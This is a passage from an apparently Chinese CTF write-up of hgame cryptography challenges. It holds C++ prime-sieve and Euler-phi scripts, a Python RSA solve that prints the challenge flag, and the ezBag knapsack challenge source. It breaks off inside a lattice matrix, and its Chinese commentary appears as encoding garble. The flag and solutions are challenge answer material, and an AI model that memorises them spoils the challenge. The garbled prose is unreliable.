== 0</code>æˆç«‹ä»£è¡¨æ­¤æ—¶ä¸ºç´ æ•°(å› ä¸ºwilsonå®šç†)</p><p>ç„¶åä½¿ç”¨c/c++å†™è„šæœ¬æ¯”è¾ƒå¥½ï¼Œpythonå®¹æ˜“çˆ†äº†</p><h3 id="è®¡ç®—ç´ æ•°çš„ä¸ªæ•°"><a class="markdownIt-Anchor" href="#è®¡ç®—ç´ æ•°çš„ä¸ªæ•°"></a> è®¡ç®—ç´ æ•°çš„ä¸ªæ•°</h3><p>åŸƒæ°ç­›</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n=<span class="hljs-number">715849728</span>;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">isPrime</span><span class="hljs-params">(n)</span></span>;<br>    <span class="hljs-type">int</span> count=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;n;i++)&#123;<br>        <span class="hljs-keyword">if</span>(!isPrime[i])&#123;<br>            count++;<br>            <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> j=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)i*i;<br>            <span class="hljs-keyword">while</span>(j&lt;n)&#123;<br>                isPrime[j]=<span class="hljs-number">1</span>;<br>                j+=i;<br>            &#125;<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;count&lt;&lt;endl;<br>    <span class="hljs-comment">//37030583</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è®¡ç®—æ¬§æ‹‰å‡½æ•°ä¹‹å’Œ"><a class="markdownIt-Anchor" href="#è®¡ç®—æ¬§æ‹‰å‡½æ•°ä¹‹å’Œ"></a> è®¡ç®—æ¬§æ‹‰å‡½æ•°ä¹‹å’Œ</h3><p>è¿™ä¸ªæ‰¾äº†ä¸ªè„šæœ¬</p><p><a href="https://blog.csdn.net/qq_35914587/article/details/78173379">å¿«é€Ÿæ±‚æ¬§æ‹‰å‡½æ•°ä¹‹å’Œ-CSDNåšå®¢</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e7</span><span class="hljs-number">+1</span>;<br>ll phi[N<span class="hljs-number">+10</span>],prime[N<span class="hljs-number">+10</span>];<br><span class="hljs-type">int</span> tot;<br><span class="hljs-type">bool</span> mark[N<span class="hljs-number">+10</span>];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getphi</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    phi[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)<br>     &#123;<br>        <span class="hljs-keyword">if</span>(!mark[i])<br>        &#123;<br>            prime[++tot]=i;<br>            phi[i]=i<span class="hljs-number">-1</span>;<span class="hljs-comment">//æ€§è´¨1</span><br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=tot&amp;&amp;i*prime[j]&lt;=n;j++)<br>        &#123;<br>            mark[i*prime[j]]=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(!(i%prime[j]))<br>             &#123;<br>                phi[i*prime[j]]=phi[i]*prime[j];<span class="hljs-comment">//æ€§è´¨2</span><br>                <span class="hljs-keyword">break</span>;<br>             &#125;<br>            <span class="hljs-keyword">else</span><br>             phi[i*prime[j]]=phi[i]*(prime[j]<span class="hljs-number">-1</span>);<br>        &#125;<br>     &#125;<br><br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)<br>      phi[i]+=phi[i<span class="hljs-number">-1</span>];<br>&#125;<br><span class="hljs-function">ll <span class="hljs-title">work</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(n&lt;=N) <span class="hljs-keyword">return</span> phi[n];<br>    ll ans=<span class="hljs-number">0</span>;<span class="hljs-type">int</span> pos;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i=pos<span class="hljs-number">+1</span>)<br>    &#123;<br>        pos=n/(n/i);<span class="hljs-comment">//å‘ä¸‹å–æ•´ï¼Œå¾ˆé•¿ä¸€æ®µæ˜¯ç›¸åŒçš„</span><br>        ans+=(pos-i<span class="hljs-number">+1</span>)*<span class="hljs-built_in">work</span>(n/i);<br>    &#125;<br>    <span class="hljs-keyword">return</span> (ll)n*(n<span class="hljs-number">+1</span>)/<span class="hljs-number">2</span>-ans;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">getphi</span>(N);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld&quot;</span>,<span class="hljs-built_in">work</span>(n));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="flag"><a class="markdownIt-Anchor" href="#flag"></a> flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> nextprime<br><br>e = <span class="hljs-number">65537</span><br>trick_result = <span class="hljs-number">155763335410704472</span>+<span class="hljs-number">37030583</span><br><br>p = q = nextprime(trick_result&lt;&lt;<span class="hljs-number">128</span>)<br><span class="hljs-built_in">print</span>(p.bit_length())<br>phi=p**<span class="hljs-number">2</span>-p<br>enc=<span class="hljs-number">2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546</span><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(enc,inverse(e,phi),p*p))))<br><span class="hljs-comment">#b&#x27;hgame&#123;sieve_is_n0t_that_HArd&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="ezbag"><a class="markdownIt-Anchor" href="#ezbag"></a> ezBag</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-built_in">list</span> = []<br>bag = []<br>p=random.getrandbits(<span class="hljs-number">64</span>)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(p)[<span class="hljs-number">2</span>:])==<span class="hljs-number">64</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    t = p<br>    a=[getPrime(<span class="hljs-number">32</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]<br>    b=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>        temp=t%<span class="hljs-number">2</span><br>        b+=temp*i<br>        t=t&gt;&gt;<span class="hljs-number">1</span><br>    <span class="hljs-built_in">list</span>.append(a)<br>    bag.append(b)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;list=<span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;bag=<span class="hljs-subst">&#123;bag&#125;</span>&#x27;</span>)<br><br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(p).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = pad(flag,<span class="hljs-number">16</span>)<br>ciphertext = cipher.encrypt(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ciphertext=<span class="hljs-subst">&#123;ciphertext&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>01èƒŒåŒ…é—®é¢˜ï¼Œä½†æ— æ³•ä½¿ç”¨å¸¸è§„è„šæœ¬æ±‚è§£</p><p>åªä½¿ç”¨ä¸€ç»„æ•°æ®çš„è¯ä¼šå‘ç°å¯†åº¦å·²ç»åˆ°äº†2.0äº†ï¼Œå¾ˆæ˜æ˜¾ä¸æ»¡è¶³</p><p>æ‰€ä»¥å¯ä»¥å¤šç”¨å‡ ç»„æ•°æ®æ„é€ æ ¼ï¼ˆä¸ºä»€ä¹ˆè¿™æ ·èƒ½å‡ºæˆ‘ä¹Ÿä¸çŸ¥é“ï¼‰</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">â€¦</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>63</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>63</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>63</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>63</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">â€¦</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>62</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>62</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>62</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>62</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">â‹±</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">â€¦</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">â€¦</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\left(\begin{matrix}1&amp;0&amp;â€¦&amp;0&amp;a[0][63]&amp;a[1][63]&amp;a[2][63]&amp;a[3][63]\\0&amp;1&amp;â€¦&amp;0&amp;a[0][62]&amp;a[1][62]&amp;a[2][62]&amp;a[3][62]\\â‹®&amp;â‹®&amp;â‹±&amp;â‹®&amp;â‹®&amp;â‹®&amp;â‹®&amp;â‹®\\0&amp;0&amp;â€¦&amp;1&amp;a[0][0]&amp;a[1][0]&amp;a[2][0]&amp;a[3][0]\\0&amp;0&amp;â€¦&amp;0&amp;b[0]&amp;b[1]&amp;b[2]&amp;b[3]\\\end{matrix}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:6.66em;vertical-align:-3.079999999999999em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.550045em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â</span></span></span><span style="top:-1.8999850000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âœ</span></span></span><span style="top:-2.4949950000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âœ</span></span></span><span style="top:-3.090005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âœ</span></span></span><span style="top:-3.6850150000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âœ</span></span></span><span style="top:-4.280025em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âœ</span></span></span><span style="top:-4.3100249999999996em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>âœ</span></span></span><span style="top:-5.550045em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â›</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.240000000000001em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">â€¦</span></span></span><span style="top:-5.04em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">â€¦</span></span></span><span style="top:-3.18em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">â‹±</span></span></span><span style="top:-1.9800000000000009em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">â€¦</span></span></span><span style="top:-0.7800000000000009em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">â€¦</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">3</span><span class="mclose">]</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">3</span><span class="mclose">]</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">3</span><span class="mclose">]</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span 